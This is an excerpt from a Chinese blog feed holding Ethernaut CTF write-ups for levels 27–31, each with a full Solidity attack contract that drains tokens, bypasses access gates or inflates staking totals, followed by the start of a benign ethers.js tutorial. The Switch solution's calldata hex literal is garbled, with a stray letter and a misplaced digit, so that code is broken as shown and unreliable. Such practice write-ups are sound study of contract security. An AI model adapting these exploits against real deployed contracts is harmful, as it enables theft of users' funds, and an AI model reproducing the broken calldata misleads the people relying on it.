&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>部署这个合约，再把部署好的 <code>forta</code> 合约调出来，调用 <code>setDetectionBot( $&#123;bot 合约地址&#125; )</code> 就可以了。</p><h2 id="27-Good-Samaritan"><a href="#27-Good-Samaritan" class="headerlink" title="27. Good Samaritan"></a>27. Good Samaritan</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>数值膨胀结束了。由它给的提示可知，错误大致和函数一样，有一个 “错误签名”，每一个错误可以通过签名唯一标识。</p><p>按照要求，要获取所有的代币，必须捕获到错误 <code>NotEnoughBalance()</code>，因此我们看向 <code>Wallet</code> 的 <code>donate10()</code>，通过 <code>if</code> 抛出显然不现实，因此看向 <code>coin.transfer()</code>，发现，当 <code>msg.sender</code> 是一个合约时，可以调用它的 <code>notify(uint256)</code>，那么操作空间就很大了。</p><p>如果我们通过合约去调用 <code>requestDonation()</code>，一路传递下去的 <code>msg.sender</code> 就是它的地址。我们只要自己实现这个 <code>notify()</code>，在里面抛出同名异常 <code>NotEnoughBalance()</code> 就可以了。</p><h3 id="实现-13"><a href="#实现-13" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity &gt;=0.8.0 &lt;0.9.0;<br><br>interface INotifyable &#123;<br>    function notify(uint256 amount) external;<br>&#125;<br><br>interface IGoodSamaritan&#123;<br>    function wallet() view external returns(address wallet);<br>    function coin() view external returns(address coin);<br>    function requestDonation() external returns(bool enoughBalance);<br>&#125;<br><br>interface ICoin&#123;<br>    function balances(address) view external returns(uint256);<br>&#125;<br><br>contract pass is INotifyable&#123;<br>    IGoodSamaritan goodSamaritan;<br>    address coin;<br><br>    error NotEnoughBalance();<br><br>    constructor(IGoodSamaritan _goodSamritan) &#123;<br>        goodSamaritan = _goodSamritan;<br>        coin = goodSamaritan.coin();<br>    &#125;<br><br>    function shutUpAndTakeMyMoney() public &#123;<br>        goodSamaritan.requestDonation();<br>        // 检查一下，省点测试币<br>        require(ICoin(coin).balances(address(this)) &gt; 10);<br>    &#125;<br><br>    function notify(uint256 amount) external pure&#123;<br>        if (amount == 10) revert NotEnoughBalance();<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="28-Gatekeeper-Three"><a href="#28-Gatekeeper-Three" class="headerlink" title="28. Gatekeeper Three"></a>28. Gatekeeper Three</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><h4 id="1-Gate-One"><a href="#1-Gate-One" class="headerlink" title="1. Gate One"></a>1. Gate One</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateOne() &#123;<br>    require(msg.sender == owner);<br>    require(tx.origin != owner);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><p>要注意，这里的条件和之前的守门人不同。<code>owner</code> 是钱包地址的话，这看起来不可能，<code>tx.origin</code> 必须是EOA，在这里只能是我们的钱包地址，就算我们找了第二个钱包，也不可能使 <code>msg.sender</code> 是 <code>owner</code>。因此，我们肯定可以更改 <code>owner</code>。</p><p>怀疑肯定是 <code>owner</code> 有问题，用 <code>await contract.owner()</code> 查一下，发现 <code>owner</code> 是 0。定睛一看，诶~☝️🤓，这 <code>constructor</code> 不太对啊。所以就可以通过 <code>construct0r()</code> 随意更改 <code>owner</code>。在 <code>tx.origin</code> 肯定是钱包地址的情况下，<code>owner</code> 只能是攻击合约地址，要使 <code>msg.sender</code> 也是攻击合约地址。有两种方式：1. 使用 <code>address(this).函数名()</code> 来调用本合约的函数；2. 使用一个中间合约，在攻击合约的函数里调用中间合约的函数。这里采用第二种方式。</p><h4 id="2-Gate-Two"><a href="#2-Gate-Two" class="headerlink" title="2. Gate Two"></a>2. Gate Two</h4> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateTwo() &#123;<br>    require(allowEntrance == true);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以通过函数 <code>getAllowance(uint256)</code> 修改，它调用了 <code>trick.checkPassword(_password)</code>，也就是要让 <code>_password</code> 等于创建时的 <code>timestamp</code>。因此我们直接调用 <code>createTrick()</code> 创建一个 <code>SimpleTrick</code> 合约，获取它的地址，再通过插槽直接得到 <code>timestamp</code> 即可。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">creatTrick</span>()<br><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">trick</span>() <span class="hljs-comment">// 获取合约地址 _addr</span><br><span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;_addr&quot;</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// 很显然，password 在 2 号插槽，返回值就是16进制的 password</span><br></code></pre></td></tr></table></figure><h4 id="3-Gate-Three"><a href="#3-Gate-Three" class="headerlink" title="3. Gate Three"></a>3. Gate Three</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">modifier gateThree() &#123;<br>    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;<br>        _;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个条件说明，我们要向该合约发送不少于 <code>0.001 ether</code>，为了方便，取 <code>2 Finney</code>。并且它要求无法向攻击合约发送 ETH，这很简单。只要在创建中间商时传入 <code>2 Finney</code>，然后在调用函数时发给它即可，然后攻击合约不写 <code>fallback</code> 和 <code>receive</code> 就行。</p><h3 id="实现-14"><a href="#实现-14" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 由于原合约可以通过编译，就不用写接口了，上面直接放原合约<br>contract pass&#123;<br>    Akashi akashi;<br>    GatekeeperThree gatekeeper;<br><br>    constructor(Akashi _akshi, GatekeeperThree _gatekeeper) &#123;<br>        akashi = _akshi;<br>        gatekeeper = _gatekeeper;<br>    &#125;<br><br>    function plzBeShorekeeperInstead() public &#123;<br>        uint256 password = uint256(0x67f6518c);<br>        akashi.firstHandCall(password);<br>    &#125;<br>&#125;<br><br>contract Akashi&#123;<br>    GatekeeperThree  gatekeeper;<br>    constructor(GatekeeperThree _gatekeeper) payable&#123;<br>        gatekeeper = _gatekeeper;<br>    &#125;<br><br>    function firstHandCall(uint256 password) public &#123;<br>        gatekeeper.construct0r();<br><br>        gatekeeper.getAllowance(password);<br><br>        (bool success, ) = payable(address(gatekeeper)).call&#123;value: address(this).balance&#125;(&quot;&quot;);<br>        require(success &amp;&amp; gatekeeper.allowEntrance());<br><br>        gatekeeper.enter();<br>        require(gatekeeper.entrant() == tx.origin);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="29-Switch"><a href="#29-Switch" class="headerlink" title="29. Switch"></a>29. Switch</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>calldata 相关的编码和组成可以看这里：<a href="https://docs.soliditylang.org/en/v0.8.19/abi-spec.html#function-selector-and-argument-encoding">Function Selector and Argument Encoding</a></p><p>看合约，要拨动开关只能通过函数 <code>flipSwitch()</code>，它有一个修饰器，要求从 calldata 的 64B 开始取4字节的值就是 <code>turnSwitchOff()</code> 的函数选择器。要注意，不能过分相信它的注释，不然会浪费很多时间。因此，我们肯定不能给 <code>_data</code> 传入简单的 abi encode 后的结果，要手动写一串 calldata。由于直接调用 <code>flipSwitch()</code> 会导致它自动写好一部分 calldata（即无法利用动态字节数组编码的一些特性性），我们的操作空间不足，因此，我们要直接从调用 <code>flipSwitch</code> 开始编写。</p><p>首先，要调用这个函数，先传入4字节的函数选择器 <code>0x30c13ade</code>，接下来32字节是动态数组数据域的偏移量，暂时不知道，先用 0 填满，再下来32字节，啥也没有，再下来32字节，就到了读取 selector 的地方了，我们要靠左放<code>turnSwitchOff()</code> 的函数选择器，然后用 0 填满。接下来除了数据域就没别的了，因此后32字节就存 <code>_data</code> 的长度，就一个函数选择器4字节，顺便把之前的偏移量补好，不算4字节的函数选择器，总共偏移了 3 x 32 = 96(B)，就是 0x60。最后再写4字节，就是 <code>_data</code> 实际的值——<code>turnSwitchOn()</code> 的函数选择器 <code>0x76227e12</code>。</p><p>综合下来，整个 calldata 就是这样的：<br><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">/** calldata</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">*  4B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">flipSwitch() 的函数选择器            0x30c13ade</span><br>  <span class="hljs-attribute">*  32B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">_data 数据域的起始位置(96B)          0x0000000000000000000000000000000000000000000000000000000000000060</span><br>  <span class="hljs-attribute">*  32B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">空的                                0x0000000000000000000000000000000000000000000000000000000000000000</span><br>  <span class="hljs-attribute">*  32B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">读selector的地方，放offSelector      0x20606e1500000000000000000000000000000000000000000000000000000000</span><br>  <span class="hljs-attribute">*  32B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">_data 数据域的起始位置，放数据长度(4B)  0x0000000000000000000000000000000000000000000000000000000000000004</span><br>  <span class="hljs-attribute">*  4B</span><span class="hljs-punctuation">:</span> <span class="hljs-string">flipSwitch() 真正 call 的函数选择器    0x76227e12</span><br> **/<br></code></pre></td></tr></table></figure></p><h3 id="实现-15"><a href="#实现-15" class="headerlink" title="实现"></a>实现</h3><p>这个可以本地试成功了再用钱包交，不然试多了气费遭不住。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 此处上方省略了题目部分，可以编译，直接复制来用就行<br>contract pass&#123;<br>    Switch target;<br>    bytes4 public onSelector = target.turnSwitchOn.selector; <br>    bytes4 public flipSelector = target.flipSwitch.selector; <br>    bytes4 public offSelector = target.turnSwitchOff.selector; <br><br>    constructor(Switch _tar) &#123;<br>        target = _tar;<br>    &#125;<br>    <br>    function turnOn() public &#123;<br>        bytes memory calldt = hex&quot;30c13adev<br>    0000000000000000000000000000000000000000000000000000000000000060<br>    0000000000000000000000000000000000000000000000000000000000000000<br>    20606e1500000000000000000000000000000000000000000000000000000000<br>    000000000000000000000000000000000000000000000000000000000000000<br>    476227e12&quot;;<br>        (bool success, ) = address(target).call(calldt);<br>        require (success, &quot;failed&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="30-Higher-Order"><a href="#30-Higher-Order" class="headerlink" title="30. Higher Order"></a>30. Higher Order</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>我们要给 <code>treasury</code> 赋一个至少为 256 的值。观察函数 <code>registerTreasury(uint8)</code>，里面那句的意思是，从 calldata 的 4B 处开始，往后读 32B，将这个值赋给存在 <code>treasury_slot</code>，也就是 <code>treasury</code> 变量所在的那个槽。这就很简单了，由于该关使用的 <code>0.6.12</code> 版本不会对这种溢出进行检查，所以大胆地用 calldata 传入大于等于 256 的值即可。</p><h3 id="实现-16"><a href="#实现-16" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 省略了题目部分，可以编译，直接用就行<br>contract pass&#123;<br>    HigherOrder higherOrder;<br>    bytes4 public register = higherOrder.registerTreasury.selector;<br><br>    constructor(HigherOrder _higherOrder)  &#123;<br>        higherOrder = _higherOrder;<br>    &#125;<br>    <br>    function toHighest() public &#123;<br>        bytes memory calldt = abi.encodeWithSignature(&quot;registerTreasury(uint8)&quot;, 256);<br> /** 或者自己写也行<br> *  bytes memory calldt = <br> *  hex&quot;211c85ab0000000000000000000000000000000000000000000000000000000000000100&quot;;<br>**/<br>        (bool success, ) = address(higherOrder).call(calldt);<br>        require(success, &quot;falied&quot;);<br>    &#125;<br>&#125;<br>/** calldata:<br> *  4B:  0x211c85ab<br> *  32B: 0x0000000000000000000000000000000000000000000000000000000000000100 (256)<br>**/<br></code></pre></td></tr></table></figure><p>由于它是把 <code>msg.sender</code> 赋给 <code>commander</code>，最后还要手动调用 <code>claimLeadership()</code>，而不能直接写在函数里。</p><h2 id="31-Stake"><a href="#31-Stake" class="headerlink" title="31. Stake"></a>31. Stake</h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>首先，通过该关有4个条件。先看后两个，成为质押者并且质押为0。这很简单，只要先 <code>StakeETH()</code>，然后再通过 <code>Unstake()</code> 取出等量 ETH 即可，之后就仅通过攻击合约与题目交互。</p><p>观察 <code>selector</code>，就会发现，<code>StakeWETH()</code> 中的两个 call，分别是检查<code>msg.sender</code> 给 <code>Stake</code> 合约的 allowance，和从 <code>msg.sender</code> 向 <code>Stake</code> 合约发送 <code>amount</code> 个 ETH。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function StakeWETH(uint256 amount) public returns (bool)&#123;<br>    require(amount &gt; 0.001 ether, &quot;Don&#x27;t be cheap&quot;);<br>    // function allowance(address owner, address spender) external view returns (uint256)<br>    //                                                           allowance()    owner       spender<br>    (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));<br>    require(bytesToUint(allowance) &gt;= amount,&quot;How am I moving the funds honey?&quot;);<br>    totalStaked += amount;<br>    UserStake[msg.sender] += amount;<br>    // function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)<br>    //                                                   transferFrom()  sender     recipient     amount <br>    (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender, address(this), amount));<br>    Stakers[msg.sender] = true;<br>    return transfered;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于该合约所有的 <code>call</code> 都没有检查返回值（即检查 call 是否成功），我们就可以利用这一点，让它先 <code>totalStaked += amount</code>，然后失败地调用 <code>transferFrom()</code>，导致我们没有 WETH 转给该合约，而通过 <code>WETH</code> 合约（用 ERC20接口）可知，我们账户上并没有这种代币，因此， call 是必定失败的。因此，攻击合约就可以先 <code>approve()</code> 一个随便的值，然后再调用 <code>StakeWETH()</code> 把 <code>totalStaked</code> 加成一个很大的值。</p><p>最后是第一个条件，我们直接通过攻击合约给它转一点 ETH 即可。</p><h3 id="实现-17"><a href="#实现-17" class="headerlink" title="实现"></a>实现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract pass&#123;<br>    IERC20 weth;<br>    Stake stake;<br>    // 传入 2 finney<br>    constructor(IERC20 _weth, Stake _stake) payable &#123;<br>        weth = _weth;<br>        stake = _stake;<br>    &#125;<br><br>    function squeezeDry() public &#123;<br>        // 在此之前，手动 stake 0.002 ETH (2000000000000000 wei)再取出<br>        weth.approve(address(stake), 10 ether);<br>        bool success = stake.StakeWETH(10 ether);<br>        require(!success, &quot;Succeed to stake weth&quot;);<br>        stake.StakeETH&#123;value: address(this).balance&#125;();<br>    &#125;<br><br>    function payback(address me) public &#123;<br>        uint256 amount = address(this).balance;<br>        (bool success, ) = me.call&#123;value: amount&#125;(&quot;&quot;);<br>        require(success, &quot;I&#x27;m done&quot;);<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ethers.js</title>
    <link href="/2025/01/12/ethers-js/"/>
    <url>/2025/01/12/ethers-js/</url>
    
    <content type="html"><![CDATA[<p>以下对于以太坊主网，使用公用 rpc 节点，对于测试网 Sepolia，使用自己的 API key。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INFURA_ID</span> = <span class="hljs-string">&#x27;/* 你的 API key */&#x27;</span>;<br><span class="hljs-keyword">const</span> providerSepolia = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">JsonRpcProvider</span>(<span class="hljs-string">`https://sepolia.infura.io/v3/<span class="hljs-subst">$&#123;INFURA_ID&#125;</span>`</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">ALCHEMY_MAINNET_URL</span> = <span class="hljs-string">&#x27;https://rpc.ankr.com/eth&#x27;</span>;<br><span class="hljs-keyword">const</span> providerETH = <span class="hljs-keyword">new</span> ethers.<span class="hljs-title class_">JsonRpcProvider</span>(<span class="hljs-variable constant_">ALCHEMY_MAINNET_URL</span>);<br></code></pre></td></tr></table></figure><h1 id="0-BigInt-和单位处理"><a href="#0-BigInt-和单位处理" class="headerlink" title="0. BigInt 和单位处理"></a>0. <code>BigInt</code> 和单位处理</h1><p>由于以太坊中很多运算都超出了整数的安全值，所以 <code>ethers.js</code> 的很多返回值都是 <code>BigInt</code>。</p><p>可以使用 <code>`ethers.getBigInt()</code> 将 字符串或其他进制的数转换为 <code>BigInt</code>。</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">ethers.getBig<span class="hljs-meta">Int</span>(<span class="hljs-string">&quot;1234567890&quot;</span>)<br>ethers.getBig<span class="hljs-meta">Int</span>(<span class="hljs-string">&#x27;0xCba123&#x27;</span>)<br>ethers.getBig<span class="hljs-meta">Int</span>(1122334455)<br></code></pre></td></tr></table></figure><p><strong>注意</strong>，超过js最大安全整数的数值将不能转换。</p><h2 id="单位处理"><a href="#单位处理" class="headerlink" title="单位处理"></a>单位处理</h2><p>以太坊有如下单位。</p><p><img src="https://www.wtf.academy/assets/images/10-3-de6c78745601e096f4d0f462c3407e46.png" alt="0.1.1"></p><ul><li><code>formatUnits(变量, 单位)</code>，单位填上面表里左侧的单位名，或者直接填数字（填几就相当于乘10的几次方的单位）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> gwei = <span class="hljs-title class_">BigInt</span>(<span class="hljs-number">1e9</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ethers.<span class="hljs-title function_">formatUnits</span>(gwei, <span class="hljs-number">9</span>))<span class="hljs-comment">// 就是 gwei</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ethers.<span class="hljs-title function_">formatUnits</span>(gwei, <span class="hljs-string">&#x27;ether&#x27;</span>))<span class="hljs-comment">// 单位为 ether</span><br></code></pre></td></tr></table></figure><ul><li><code>parseUnits(变量, 单位)</code>，变量是字符串形式，将任意单位转换为 wei，单位处不写默认是 ether</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ethers.<span class="hljs-title function_">parseUnits</span>(<span class="hljs-string">&#x27;1.23&#x27;</span>, <span class="hljs-number">9</span>).<span class="hljs-title function_">toString</span>())<span class="hljs-comment">// 1.23 gwei =&gt; ···wei</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ethers.<span class="hljs-title function_">parseUnits</span>(<span class="hljs-string">&#x27;4.56&#x27;</span>, <span class="hljs-string">&#x27;ether&#x27;</span>).<span class="hljs-title function_">toString</span>()) <span class="hljs-comment">// 4.56 ether =&gt; ···wei</span><br></code></pre></td></tr></table></figure><h1 id="1-Provider-类"><a href="#1-Provider-类" class="headerlink" title="1. Provider 类"></a>1. <code>Provider</code> 类</h1><p><code>provider</code> 有以下几个简单的运用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">main</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyAddr</span> = <span class="hljs-string">&#x27;0xCba28960338E1953b2b4C1750D326729029C82d3&#x27;</span>;<br><br>    <span class="hljs-comment">// 对于钱包信息的查询</span><br>        <span class="hljs-comment">/* 1. 查询余额：getBalance(地址) */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;1. 余额&#x27;</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">BalanceOfVitalik</span> = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getBalance</span>(<span class="hljs-string">&#x27;vitalik.eth&#x27;</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">BalanceOfVitalikETH</span> = ethers.<span class="hljs-title function_">formatEther</span>(<span class="hljs-title class_">BalanceOfVitalik</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyBalance</span> = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getBalance</span>(<span class="hljs-title class_">MyAddr</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyBalanceETH</span> = ethers.<span class="hljs-title function_">formatEther</span>(<span class="hljs-title class_">MyBalance</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`vitalik:<span class="hljs-subst">$&#123;BalanceOfVitalikETH&#125;</span>\n我:<span class="hljs-subst">$&#123;MyBalanceETH&#125;</span>`</span>);<br>        <span class="hljs-comment">/* 2. 查询历史交易次数：getTransactionCount(地址) */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;\n2. 交易次数&#x27;</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">CountOfVitalik</span> = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getTransactionCount</span>(<span class="hljs-string">&#x27;vitalik.eth&#x27;</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">MyCount</span> = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getTransactionCount</span>(<span class="hljs-title class_">MyAddr</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`vitalik:<span class="hljs-subst">$&#123;CountOfVitalik&#125;</span>\n我:<span class="hljs-subst">$&#123;MyCount&#125;</span>`</span>);<br><br>    <span class="hljs-comment">//对于 provider 本身的查询 </span><br>        <span class="hljs-comment">/* 1.  查询 provider 所连接的链：getNetwork() */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;\n3. provider 连接到的链&#x27;</span>);<br>    <span class="hljs-keyword">const</span> mainNet = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getNetwork</span>();<br>    <span class="hljs-keyword">const</span> testNet = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getNetwork</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mainNet.<span class="hljs-title function_">toJSON</span>());<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(testNet.<span class="hljs-title function_">toJSON</span>()); <br>        <span class="hljs-comment">/* 2. 查询建议的 gas 设置： getFeeData() */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;\n4. gas 设置&#x27;</span>);<br>    <span class="hljs-keyword">const</span> mainnetFee = <span class="hljs-keyword">await</span> providerETH.<span class="hljs-title function_">getFeeData</span>();<br>    <span class="hljs-keyword">const</span> testnetFee = <span class="hljs-keyword">await</span> providerSepolia.<span class="hljs-title function_">getFeeData</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mainnetFee);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(testnetFee);<br>        <span class="hljs-comment">/* 3. 查询当前网络的区块高度： getBlockNumber()  */</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;\n5. 当前区块高度&#x27;</span>);<br>    <span class="hljs-keyword">const</span> mainnetNum = <span 